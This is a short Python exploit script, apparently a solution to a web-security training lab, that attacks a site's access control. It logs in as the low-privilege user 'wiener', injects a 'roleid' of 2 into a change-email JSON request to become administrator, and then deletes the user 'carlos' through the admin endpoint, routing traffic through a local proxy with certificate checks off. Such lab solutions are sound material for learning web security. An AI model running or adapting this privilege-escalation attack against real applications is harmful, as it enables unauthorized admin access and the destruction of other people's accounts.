
import requests as rs
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}


def delete_user(s,url):
    
    # login as weiner
    login_url = url + '/login'
    data_login = {
        'username' : 'wiener',
        'password' : 'peter'
    }
    
    r = s.post(login_url, data=data_login, proxies=proxies, verify=False)
    res = r.text
    
    if "Log out" in res:
        sys.stdout.write("\n[+] Successfully logged in as wiener\n")

        # change user roleid of the user
        change_email_url = url + '/my-account/change-email'
        data_role_change = {"email":"test@test.com", "roleid": 2}
        r = s.post(change_email_url,json=data_role_change,verify=False, proxies=proxies)
        res = r.text
        if 'Admin' in res:
            sys.stdout.write("[+] Successfully changed user roleid to 2\n")

            # delete carlos user
            delete_carlos_usr_url = url + '/admin/delete?username=carlos'
            r = s.get(delete_carlos_usr_url, verify=False, proxies=proxies)
            
            if r.status_code == 200:
                sys.stdout.write("[+] Successfully deleted carlos user\n")
                
            else:
                sys.stdout.write("[-] Failed to delete carlos user\n")
                sys.exit(1)


        else:
            sys.stdout.write("[-] Failed to change user roleid\n")
            sys.exit(1)

    else:
        sys.stdout.write("[-] Failed to log in as wiener\n")
        sys.exit(1)
    
    
    
    



def main():
    if len(sys.argv) != 2:
        sys.stdout.write("Usage : python3 $0 <URL>\n")
        sys.exit(1)

    s = rs.Session()
    url = sys.argv[1]
    delete_user(s,url)

    
    


if __name__ == '__main__':
    main()